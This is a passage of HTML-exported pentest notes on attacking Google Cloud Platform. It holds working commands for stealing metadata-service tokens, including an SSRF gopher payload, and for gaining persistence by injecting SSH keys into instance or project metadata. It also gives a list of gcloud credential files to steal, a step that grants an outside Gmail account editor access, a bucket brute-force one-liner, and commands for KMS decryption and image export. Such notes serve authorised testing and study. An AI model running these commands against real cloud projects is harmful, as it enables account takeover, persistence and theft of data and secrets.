style="white-space:pre-wrap;word-break:break-all">{
+      &quot;access_token&quot;:&quot;ya29.AHES6ZRN3-HlhAPya30GnW_bHSb_QtAS08i85nHq39HE3C2LTrCARA&quot;,
+      &quot;expires_in&quot;:3599,
+      &quot;token_type&quot;:&quot;Bearer&quot;
+ }</code></pre><h1 id="88f3d1c0-58dc-4fc6-89c6-726eec09fa9d" class=""><strong>Application Default Credentials</strong></h1><ul id="9b398a64-7095-4e6c-b102-439d3618e271" class="bulleted-list"><li style="list-style-type:disc">alternative to pulling a token from the metadata service<ul id="b1609b01-4318-4d93-a8fb-90ba21855bd7" class="bulleted-list"><li style="list-style-type:circle">this method is used when implementing one of Google’s official GCP client libraries</li></ul></li></ul><p id="c8a73c63-43d8-437a-80c2-3896d690b87c" class="">The following are the steps taken to search for credentials when using the GCP client libraries:</p><ol type="1" id="e5fb538d-4a78-4436-9de2-d7cdf8424367" class="numbered-list" start="1"><li>Code will check source code<ol type="a" id="cea44406-06c7-44ea-8031-b015ae3d4d46" class="numbered-list" start="1"><li>The service account key file is checked</li></ol></li></ol><ol type="1" id="46f3c23f-72b1-445e-be4f-d13abcbe5d43" class="numbered-list" start="2"><li>The <code>GOOGLE_APPLICATION_CREDENTIALS</code> environment variable is checked<ol type="a" id="ccb0944d-5fe5-4c67-8523-7ee9d27ea65c" class="numbered-list" start="1"><li>This environment variable can be set to the location of a service account key file</li></ol></li></ol><ol type="1" id="0f98cf2a-6f37-4837-8adc-77633f1688b3" class="numbered-list" start="3"><li>The default token in the metadata service is used.</li></ol><ul id="309d5f22-6be7-438f-9d56-87a350d581df" class="bulleted-list"><li style="list-style-type:disc">the default token in the metadata service is used only if 1 or 2 is not found because the metadata service token is confined within access scopes and is temporary</li></ul><h1 id="324f7f73-74b6-4c74-9971-7c8e84b8a320" class=""><strong>Privilege Escalation</strong></h1><p id="dd168f3f-4245-4666-b344-47565ab758e7" class="">⭐ Always make sure to check if the principle of least-privilege is being applied throughout the environment</p><h1 id="22e39dd5-6a82-4a6a-9e80-891926bee454" class=""><strong>SSRF</strong></h1><p id="71040cb9-5fcf-437a-9210-906594e12f0c" class="">The privesc techniques described below are written from the perspective of internal access to a compromised instance. However, they can also be performed if you find SSRF in some cases.</p><h1 id="8758ae08-97e1-44a7-9f6a-167314119220" class=""><strong>Insecure Metadata Endpoint</strong></h1><p id="7929e9b7-a348-427e-9f2c-3d62b29d0dc0" class="">If <code>/v1beta1</code> is enabled, you can get the access token without the special header:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="15a82886-48ae-4b8a-872e-48bed15b5f34" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</code></pre><p id="3f11de89-e516-4224-89da-9ceb5ed9af30" class="">If you have SSRF, check if the gopher protocol is enabled. It may be possible to query the metadata service with:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d140ae8e-5d27-4577-8f68-be2c75cbeb67" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl gopher://metadata.google.internal:80/xGET%2520/computeMetadata/v1/instance/%2520HTTP%252f%2531%252e%2531%250AHost:%2520metadata.google.internal%250AAccept:%2520%252a%252f%252a%250aMetadata-Flavor:%2520Google%250d%250a</code></pre><p id="ebac260e-1b45-430f-bc11-8b006d7ba4cc" class="">Otherwise, you must query <code><a href="http://metadata.google.internal/computeMetadata/v1beta/instance/service-accounts/default/token">http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</a></code> with a custom header set</p><ul id="3bff4768-469b-49fd-93bc-7be0e7e2bbc6" class="bulleted-list"><li style="list-style-type:disc">note the authorization token expires within 1 hour by default</li></ul><h1 id="3bc6f813-e52d-47c7-a867-d157c89ebb9c" class=""><strong>Compute Instances</strong></h1><h1 id="de85d8e9-e3fd-46d1-9744-9981ae2bca3c" class=""><strong>General</strong></h1><ul id="6e891b92-b84a-4312-86e3-dc014de274b0" class="bulleted-list"><li style="list-style-type:disc">just because an access scope blocks a certain command, does not mean that any variations of that command cannot be run<ul id="e83eb299-0f17-4427-8943-013d8240720a" class="bulleted-list"><li style="list-style-type:circle">e.g. if <code>gsutil ls</code> returns no storage buckets, you may still be able to query a storage bucket by specifying the name of the bucket for example <code>gsutil ls gs://storage_bucket_example-1234567</code></li></ul></li></ul><p id="7bffe440-ac3c-41fc-a04b-3734f481ca28" class="">Enumerate scripts within the following areas:</p><p id="807d0b6a-0a87-4ee8-aecb-20ae5c90e15e" class="">1. Instance metadata<br/>1. Local filesystem<br/>1. Service unit files<br/>1. etc.<br/></p><ul id="6b8ca8f4-4dc4-431d-b4e2-3b339a0c93c4" class="bulleted-list"><li style="list-style-type:disc">scripts help tell what the instance is meant for and what it has access to</li></ul><h1 id="6deef384-640f-43a1-974d-12c85a1f459c" class=""><strong>Modifying Instance Metadata</strong></h1><p id="3ab72332-1314-4792-9a1a-7c74a259c3f8" class=""><strong>Default Service Account</strong></p><p id="03c8c1fc-bd99-4253-8196-231e1561a14c" class="">The following access scopes are offered for default service accounts:</p><p id="865679b5-ddad-4448-9d74-6f39c68bf6d6" class="">1. Allow default access (default)<br/>1. Allow full access to all Cloud APIs<br/>1. Set access for each API<br/></p><ul id="e92bf4ca-65e1-41a3-837f-da2f1bfc5612" class="bulleted-list"><li style="list-style-type:disc">if 3 (with compute API access) or 2 is enabled, privesc is potentially possible</li></ul><p id="1bef2c15-88d0-4177-952c-5c1b084f9044" class=""><strong>Custom Service Account</strong></p><ul id="64b1c3bf-d7a9-4103-a1db-affac9db57b7" class="bulleted-list"><li style="list-style-type:disc">Google discourages using access scopes for custom service accounts</li></ul><p id="d2b41e3f-f0ec-499c-9c5c-f519d2e01676" class="">One of the following privileges necessary for privesc:</p><p id="f842e64e-ded9-4863-b35e-1e76fbf063c1" class="">1. <code>compute.instances.setMetadata</code><br/>1. <br/><code>compute.projects.setCommonInstanceMetadata</code></p><p id="dbb9afe1-f243-496e-8bf2-26a5ea245514" class="">It is necessary to be able to authenticate to either <code><a href="https://www.googleapis.com/auth/compute">https://www.googleapis.com/auth/compute</a></code> or <code>https://www.googleapis.com/auth/cloud-platform</code></p><p id="a14ff589-72be-467f-9fb1-49b1354ef176" class="">Adding SSH Key to Metadata</p><ul id="6c75fbdd-54b0-4db7-a52c-52c336505975" class="bulleted-list"><li style="list-style-type:disc">Linux GCP systems typically run Python Linux Guest Environment within Compute Engine scripts<ul id="01f591d0-35cc-4294-bcd4-1213d8d44e53" class="bulleted-list"><li style="list-style-type:circle">account daemon queries metadata for changes to authorized SSH keys, and will add a new key to an existing user or a user with <code>sudo</code> rights</li></ul><ul id="766608ca-bf9b-4aab-8455-596e19ddbe3f" class="bulleted-list"><li style="list-style-type:circle">if custom project metadata can be modified, persistence is established on all systems within the GCP project running the accounts daemon<code>Block project-wide SSH keys</code> option enabled</li></ul></li></ul><p id="c6c6a10c-7401-4125-8b36-794e7965ee3c" class="">Adding SSH Key to Existing Privileged User</p><p id="922643ea-5da9-4eee-ac48-653e40842ce4" class=""><code>gcluod compute instance describe &lt;INSTANCE&gt; --zone &lt;ZONE&gt;</code></p><p id="0fecb130-a929-49a1-9de5-3643d0e08462" class="">This returns something like the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d68c00c9-786d-40da-b7ca-40b449c82b42" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[...]
+- key: ssh-keys
+     value: |-
+       high-priv-user:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ high-priv-user
+       low-priv-user:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbk[...]</code></pre><ol type="1" id="245e9d80-20e0-4c20-bb2d-3d02e4368344" class="numbered-list" start="1"><li>Create a key for <code>high-priv-user</code><ol type="a" id="79edd3ed-7068-4b78-9d02-cdaa9c5b081e" class="numbered-list" start="1"><li><code>ssh-keygen -t rsa -C &quot;high-priv-user&quot; -f ./key -P &quot;&quot;</code></li></ol></li></ol><ol type="1" id="ff3fd205-bea4-4d66-80d5-cf122ed4cf02" class="numbered-list" start="2"><li>Edit the public key so that it matches the format of the <code>high-priv-user</code> public key file</li></ol><ol type="1" id="2cf483e3-e675-493e-a268-e5f0ad7bb43e" class="numbered-list" start="3"><li>Add the new key to the instance metadata<ol type="a" id="a6589fec-4383-4b05-900d-6580c9d1e73a" class="numbered-list" start="1"><li><code>gcloud compute instances add-metadata &lt;INSTANCE&gt; --metadata-from-file ssh-keys=ssh_public_file.txt</code></li></ol></li></ol><p id="fd3a4a79-1726-4f05-be16-0026507480ea" class="">Creating New User with SSH Key</p><ul id="2051f051-a72c-4599-bf1e-6ac081863875" class="bulleted-list"><li style="list-style-type:disc">the same process can be used (1-3), however a new username should be specified</li></ul><ul id="91400762-e0de-4ce8-9fbe-be2490c23880" class="bulleted-list"><li style="list-style-type:disc">this gives the new user <code>sudo</code> permissions</li></ul><p id="c3e9f6d5-0310-47ce-9e5e-614e74989f35" class="">Sudo to Existing Session</p><p id="9e71357c-5cfb-4854-96aa-1725d683c6b0" class="">Use the following command to generate a new SSH key, add your current username to <code>google-sudoers</code> group, and initiate an SSH session:</p><p id="93cc8672-4bf4-416b-8929-2b90aa422163" class=""><code>gcloud compute ssh &lt;INSTANCE_NAME&gt;</code></p><ul id="745ebf1f-deaf-4012-8d77-838143f84e25" class="bulleted-list"><li style="list-style-type:disc">note this may cause more changes to the target instance’s metadata than the manual step-by-step process described above</li></ul><ul id="6bea0644-5087-47ba-ada4-cafcf09560f4" class="bulleted-list"><li style="list-style-type:disc">this uses your current username</li></ul><p id="5af4ab0b-a397-4cdb-babd-8f85bef4a82d" class="">OS Login</p><ul id="e264b516-c309-41d5-a621-822b1039f563" class="bulleted-list"><li style="list-style-type:disc">links Google user or service account to Linux identity</li></ul><ul id="a43b2284-1b75-4458-a96c-be861193791f" class="bulleted-list"><li style="list-style-type:disc">IAM permissions dictate the authorization of this request</li></ul><ul id="ea950e20-136f-4785-83b8-c0e72121e32e" class="bulleted-list"><li style="list-style-type:disc">enabled at project or instance level with the metadata key of <code>enable-oslogin = TRUE</code></li></ul><ul id="9556aa00-0705-4108-93e9-0a30dc818002" class="bulleted-list"><li style="list-style-type:disc">2FA OS login enabled with <code>enable-oslogin-2fa = TRUE</code></li></ul><ul id="4b705cbb-a70a-4d76-bbd7-5cf902e96868" class="bulleted-list"><li style="list-style-type:disc"><code>roles/compute.osLogin</code> and <code>roles/compute.osAdminLogin</code> control SSH access to instances with enabled OS Login<ul id="b041a3a1-d506-48f2-a81c-8377ea17264a" class="bulleted-list"><li style="list-style-type:circle">note the former is without sudo access while the latter is with sudo access</li></ul></li></ul><ul id="2e5d8b32-a563-4477-87a8-1b7d5d623015" class="bulleted-list"><li style="list-style-type:disc">by adding one’s SSH key to the project metadata, access to all instances can be achieved as long as the instance does not have the <code>Block pojrect-wide SSH keys</code> option enabled:<p id="6fcdc391-81e8-4816-ad26-94374f7a8857" class=""><code>gcloud compute project-info add-metadata --metadata-from-file ssh-keys=my_public_ssh-key.txt</code></p></li></ul><h1 id="bc0f0a21-1afb-4a82-bc1f-d331552df6f9" class=""><strong>Bypassing Access Scopes</strong></h1><p id="f8bf7a89-6a84-4d99-b175-905f2edb65e5" class="">Access scopes are not a security mechanism (stated by Google themselves)</p><p id="49e677ec-99ac-4916-af88-eeb5aa9a2cf4" class=""><strong>Find Token Access Scopes</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f677cedb-24aa-453f-a722-214c2326b720" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">TOKEN=&#x27;gcloud auth print-access-token&#x27;
+curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN</code></pre><ul id="0d8b62fc-c00a-4152-894a-0147ad930d66" class="bulleted-list"><li style="list-style-type:disc">access scopes have “no effect when making requests not authenticated through OAuth”<ul id="a687954f-c0e2-4e37-bc50-82d238dc0fd2" class="bulleted-list"><li style="list-style-type:circle">search for an RSA private key to authenticate to the Google Cloud API and request a new OAuth token<p id="584339f4-bd63-483a-9ce6-467411f45118" class=""><code>gcloud auth activate-service-account --key-file &lt;FILE&gt;</code></p></li></ul></li></ul><p id="c774dbf5-9b22-457d-ad71-b76947f4fdf0" class=""><strong>Check for Service Accounts with Exported Key Files</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ed4c7528-0694-4ac2-9bfd-7eff92d4b804" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">for i in $(gcloud iam service-accounts list --format=&quot;table[no-heading](email)&quot;); do
+    echo Looking for keys for $i:
+    gcloud iam service-accounts keys list --iam-account $i
+done</code></pre><ul id="e36f8ec5-892c-4553-85b1-4292d842acf4" class="bulleted-list"><li style="list-style-type:disc">default name for service account key file is <code>&lt;PROJECT_ID&gt;-&lt;PORTION_OF_KEY_ID&gt;.json</code></li></ul><ul id="2734806a-f799-4b4d-a017-c41192a39f5f" class="bulleted-list"><li style="list-style-type:disc">if access scopes are too restrictive, check if there is another instance that is more permissive<ul id="70daf42f-89fd-46af-b5f7-165c068e60be" class="bulleted-list"><li style="list-style-type:circle"><code>gcloud compute instances list --quiet</code></li></ul></li></ul><ul id="61cd9f7d-d0af-4a4c-873e-34f1673b2460" class="bulleted-list"><li style="list-style-type:disc">check if an instance has the default service account (<code>PROJECT_NUMBER-compute@developer.gserviceaccount.com</code>)</li></ul><h1 id="35362d70-79fb-441d-82b9-9ad2ba08278c" class=""><strong>Steal GCloud Authorizations</strong></h1><ul id="3f940697-2981-468f-8382-f42762c181f9" class="bulleted-list"><li style="list-style-type:disc">look for the following files:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19409e1a-6c59-4cd1-addf-a2eb9eacc59c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">~/.config/gcloud/credentials.db
+~/.config/gcloud/legacy_credentials/[ACCOUNT]/adc.json
+~/.config/gcloud/legacy_credentials/[ACCOUNT]/.boto
+~/.credentials.json</code></pre><h1 id="5824e96c-df7b-4022-bcfe-964c3fbf384d" class=""><strong>Service Account Impersonation</strong></h1><p id="1c3fa8fb-1362-4d7f-8f06-5c55b9c19c4f" class="">Three ways to impersonate a service account:</p><ol type="1" id="74af0060-53a7-4b2f-9790-be4ef08bee71" class="numbered-list" start="1"><li>Authentication using RSA private keys</li></ol><ol type="1" id="c7730a05-6a23-4d74-8671-3e88584950c5" class="numbered-list" start="2"><li>Authorization using Cloud IAM policies</li></ol><ol type="1" id="d603d92a-22a3-4348-8365-ea55d4adc3ea" class="numbered-list" start="3"><li>Deploying jobs on GCP services</li></ol><ul id="7e1250a1-4ae0-48ed-b2e6-aad1cd031504" class="bulleted-list"><li style="list-style-type:disc">can potentially impersonate another account with the <code>iam.serviceAccountTokenCreator</code> permission</li></ul><ul id="d0975377-9227-4b80-a6f7-a17ecedd582e" class="bulleted-list"><li style="list-style-type:disc">if you have <code>Owner</code> access, you can try logging into the web interface<ul id="88d632c9-dc6a-4972-8330-a49567997237" class="bulleted-list"><li style="list-style-type:circle">service accounts can’t access web interface, but you can provide <code>Editor</code>access to any arbitrary <code>@gmail.com</code> account and then login (can’t provide <code>Owner</code> access)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="014a1b05-033e-4dae-895e-62fc56fc8fc5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">gcloud projects add-iam-policy-binding &lt;PROJECT&gt; --member user:0xd4y@gmail.com --role roles/editor</code></pre></li></ul><ul id="f9d91e05-c3ea-45cd-89b8-0e5d6b487188" class="bulleted-list"><li style="list-style-type:disc">you can use <code>-impersonate-service-account</code> flag to execute a command using the specified service account:<ul id="918b3d08-23b1-44d3-becc-c6509853fe9e" class="bulleted-list"><li style="list-style-type:circle">For example: <code>gcloud compute instances list --impersonate-service-account &lt;SERVICE_ACCOUNT&gt;</code></li></ul></li></ul><h1 id="c46ed73f-b84a-4a1a-be15-f20267b1f9ec" class=""><strong>Accessing Databases</strong></h1><ul id="66d28128-e225-4642-8ef5-09ec7359466d" class="bulleted-list"><li style="list-style-type:disc">check database backups in storage buckets, and of course check other juicy information within instances</li></ul><ul id="c004feb2-725d-48fd-bb20-8494cd375392" class="bulleted-list"><li style="list-style-type:disc">some <code>gcloud</code> commands are made specifically for exporting data<ul id="aceec7cf-6f80-4737-8508-a3053b0372b5" class="bulleted-list"><li style="list-style-type:circle">need to write database to storage bucket first before downloading it</li></ul></li></ul><p id="7e3022bf-f7f8-4ade-957c-8c81c2632609" class=""><strong>Finding databases across project</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="936cdef4-7662-4143-bf3f-7f1169e456d4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Cloud SQL
+=============
+gcloud sql instances list
+gcloud sql databases list --instance [INSTANCE]
+
+Cloud Spanner
+==============
+gcloud spanner instances list
+gcloud spanner databases list --instance [INSTANCE]
+
+Cloud Bigtable
+==============
+gcloud bigtable instances list</code></pre><h1 id="3f5a6129-bc67-4de0-ae8e-4827bffe2468" class=""><strong>Storage Buckets</strong></h1><ul id="2de2b46a-8d70-4012-898a-d6dab8dc7267" class="bulleted-list"><li style="list-style-type:disc">note that default instance permissions allow read access to storage buckets</li></ul><ul id="3bf71f35-edb6-4ae4-a494-f1f0aaed42d6" class="bulleted-list"><li style="list-style-type:disc">can be found with wordlists, source code, etc.</li></ul><ul id="2e34d9dc-e498-438d-8db0-820e69a78e6e" class="bulleted-list"><li style="list-style-type:disc">use <code>gsutil</code> to interact with storage buckets</li></ul><ul id="c9a5efec-4f91-4169-868c-98451d443195" class="bulleted-list"><li style="list-style-type:disc">if <code>gsutil ls</code> returns access denied, access to storage buckets is still potentially possible, but requires the bucket name to be specified</li></ul><p id="887d4ddb-4ab1-4cf3-9860-f921a5d7607e" class=""><strong>Bash Oneliner for Bruteforcing Bucket Names</strong></p><p id="dde6a00f-8c94-4867-9ff7-328d19c379ff" class=""><code>for i in $(cat wordlist.txt); do gsutil ls -r gs://&quot;$i&quot;; done</code></p><h1 id="bbb801d8-05e5-4a35-bad9-bf6deeb12cb9" class=""><strong>Decrypting Secrets</strong></h1><ul id="d4ba1d9a-8516-421b-8d4a-b7495850acef" class="bulleted-list"><li style="list-style-type:disc">cryptographic keys stored within Cloud KMS (Key Management Service)</li></ul><ul id="f1e7d78b-81e2-4422-8b40-6f8e4eb8b374" class="bulleted-list"><li style="list-style-type:disc">individual keys stored in key rings</li></ul><h1 id="070a7bbf-f72e-4034-9a91-b8dbde5c1043" class=""><strong>Enumeration</strong></h1><ul id="be328bf9-567a-46d5-858e-890757a8969b" class="bulleted-list"><li style="list-style-type:disc">without GCloud enumeration permissions, try searching for keys in documentation, scripts, and bash history</li></ul><table id="06bb6935-cf0f-42ec-a51e-98cb0551375f" class="simple-table"><tbody><tr id="9d438577-6bf1-4adb-9ef3-afd8acd51eda"><td id="\`Vf" class=""><strong>Command</strong></td><td id="zg^&gt;" class=""><strong>Description</strong></td></tr><tr id="c759dfee-ee05-4d10-a542-f3e8c1a8cd9c"><td id="\`Vf" class=""><code>gcloud kms keyrings list --location global</code></td><td id="zg^&gt;" class="">Lists global keyrings available</td></tr><tr id="9bb41bfe-28d7-4e11-a666-87a9c5368448"><td id="\`Vf" class=""><code>gcloud kms keys list --keyring &lt;KEYRING_NAME&gt; --location global</code></td><td id="zg^&gt;" class="">Lists keys inside a keyring</td></tr><tr id="f4175a73-15a0-4534-8276-f991f0f12ccf"><td id="\`Vf" class=""><code>gcloud kms decrypt --ciphertext-file=&lt;INFILE&gt; --plaintext-file=&lt;OUTFILE&gt; --key &lt;KEY&gt; --keyring &lt;KEYRING&gt; --location global</code></td><td id="zg^&gt;" class="">Decrypts file using a key</td></tr></tbody></table><h1 id="288afe34-93ac-4a7a-96d7-16f480456a99" class=""><strong>Serial Console Logs</strong></h1><ul id="2caf84f7-9b3b-4e28-8e57-f2fd4579ab03" class="bulleted-list"><li style="list-style-type:disc">output from compute instances written from OS and BIOS to serial ports</li></ul><p id="ce2c82ff-db03-4bab-ac9f-30f13070f958" class="">Two ways to view the log files from the serial ports:</p><ol type="1" id="49d30465-26a6-4f7b-bcf5-71b826c2d199" class="numbered-list" start="1"><li>Via Compute API<ul id="2f310acf-6c2a-4cc5-8101-ac48aae27783" class="bulleted-list"><li style="list-style-type:disc">can be executed even with the <code>Compute: Read Only</code> access scope restriction</li></ul><ul id="e8930de4-a41e-4f8a-a726-47e309715382" class="bulleted-list"><li style="list-style-type:disc"><code>gcloud compute instances get-serial-port-output &lt;INSTANCE_NAME&gt; --port &lt;PORT&gt; --start start --zone &lt;ZONE&gt;</code></li></ul></li></ol><ol type="1" id="88bc6e38-76b2-4580-ac6e-1a243252691e" class="numbered-list" start="2"><li>Via Cloud Logging<ul id="557e3ab7-07bf-4809-b70f-5cb238ab505c" class="bulleted-list"><li style="list-style-type:disc">serial logs stored in Cloud Logging if enabled by admin</li></ul><ul id="6dc91dae-3811-4a6b-88c1-fe242ef21e34" class="bulleted-list"><li style="list-style-type:disc">can be accessed with logging read permissions</li></ul></li></ol><h1 id="4924cfdf-af27-4542-ad0d-28f44c6c5c0a" class=""><strong>Custom Images</strong></h1><ul id="bd97751a-77ae-4a52-9069-2596c266f56e" class="bulleted-list"><li style="list-style-type:disc">some images may contain sensitive information which you can exfiltrate and use for a new VM</li></ul><p id="8f79bd12-be3b-4759-9d7c-8a616888d233" class=""><strong>Find List of Custom Images</strong></p><p id="00221772-fac8-4d42-bed3-fd9cd8431e6f" class=""><code>gcloud compute images list --no-standard-images</code></p><p id="86f9b0ef-e72a-4546-9b49-c610aca8e0a9" class=""><strong>Export Images</strong></p><p id="3e19e419-db0d-4c35-9b5f-1f80bcf6a130" class=""><code>gcloud compute images export --image &lt;IMAGE_NAME&gt; --export-format qcow2 --destination-uri &lt;BUCKET&gt;</code></p><h1 id="907ef418-82da-4cf8-9302-fe62eae4b72c" class=""><strong>Custom Templates</strong></h1><ul id="48a0b076-76b1-4fc3-aa58-c5181a2d85a9" class="bulleted-list"><li style="list-style-type:disc">instance templates allow deployment of VMs with specific configurations<ul id="3a56d1d8-c593-4b02-8ce5-8825604477e5" class="bulleted-list"><li style="list-style-type:circle">these configurations can tell the VM which image to use, startup script, labels, etc.</li></ul></li></ul><table id="1311976e-4621-4acf-94a5-3d61474ac597" class="simple-table"><tbody><tr id="ffebc13e-b88b-4815-bc74-69254d4fd477"><td id="utUg" class=""><strong>Command</strong></td><td id="nExm" class=""><strong>Description</strong></td></tr><tr id="cfab0eea-bc4c-475d-98a2-9be990b06f85"><td id="utUg" class=""><code>gcloud compute instance-templates list</code></td><td id="nExm" class="">Lists available templates</td></tr><tr id="18f634bc-fd46-4d30-8253-a7a719881f56"><td id="utUg" class=""><code>gcloud compute instance-templates describe &lt;TEMPLATE_NAME&gt;</code></td><td id="nExm" class="">Get details of specific template</td></tr></tbody></table><ul id="23863b91-bbd4-4391-a834-68c7d408380b" class="bulleted-list"><li style="list-style-type:disc">a template can include sensitive data that can be discovered via the instance metadata</li></ul><h1 id="3760ad16-5ac7-4a74-a8bd-d2d2b5ca0a08" class=""><strong>StackDriver Logging</strong></h1><ul id="7b505620-b0f6-4cff-9401-1333cb1ad32f" class="bulleted-list"><li style="list-style-type:disc">StackDriver is a Google monitoring and logging service<ul id="d980d204-5d26-4eda-8c00-b1f8584afd52" class="bulleted-list"><li style="list-style-type:circle">Google’s equivalent of AWS CloudWatch and CloudTrail</li></ul></li></ul><ul id="bd707095-0fae-4605-be87-21ec7edbfa39" class="bulleted-list"><li style="list-style-type:disc">compute instances require <code>write</code> access to write to log files, however if <code>read</code> permissions are also granted, then logs can be read</li></ul><table 